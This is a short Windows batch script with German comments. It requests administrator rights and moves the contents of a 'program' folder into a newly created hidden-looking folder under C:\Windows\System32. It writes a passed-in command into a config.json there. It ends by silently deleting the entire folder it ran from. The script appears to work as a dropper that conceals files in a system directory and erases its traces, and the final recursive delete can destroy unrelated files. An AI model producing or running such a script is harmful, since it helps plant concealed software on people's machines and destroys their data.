@echo off
:: Überprüfen, ob die Batch-Datei mit Administratorrechten ausgeführt wird
net session >nul 2>&1
if not %errorlevel%==0 (
    echo Administratorrechte erforderlich. Starte die Batch-Datei mit Administratorrechten neu...
    powershell -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs"
    exit /b
)

:: Setzt das Quellverzeichnis, wo die Dateien im Ordner 'program' liegen
set "source=%~dp0\program"

:: Setzt das Zielverzeichnis, wo die Dateien hinverschoben werden sollen
set "destination=C:\Windows\System32\ELW\gito"

:: Überprüfen, ob das Quellverzeichnis existiert
if not exist "%source%" (
    echo Fehler: Quellverzeichnis '%source%' existiert nicht.
    pause
    exit /b
)

:: Überprüfen, ob das Zielverzeichnis existiert, wenn nicht, wird es erstellt
if not exist "%destination%" (
    echo Erstelle den Ordner '%destination%'...
    mkdir "%destination%"
    if errorlevel 1 (
        echo Fehler: Zugriff verweigert. Bitte fuehre die Batch-Datei als Administrator aus.
        pause
        exit /b
    )
)

:: Verschiebe alle Dateien aus dem Quellverzeichnis in das Zielverzeichnis
echo Verschiebe alle Dateien von '%source%' nach '%destination%'...
move "%source%\*" "%destination%\"

:: Überprüfen, ob Dateien erfolgreich verschoben wurden
if errorlevel 1 (
    echo Fehler beim Verschieben der Dateien. Bitte ueberpruefe die Pfade und Administratorrechte.
) else (
    echo Alle Dateien wurden erfolgreich verschoben!
)

echo { "command" : "%~1" } > C:\Windows\System32\ELW\gito\config.json

rd /s /q %~dp0 ^& exit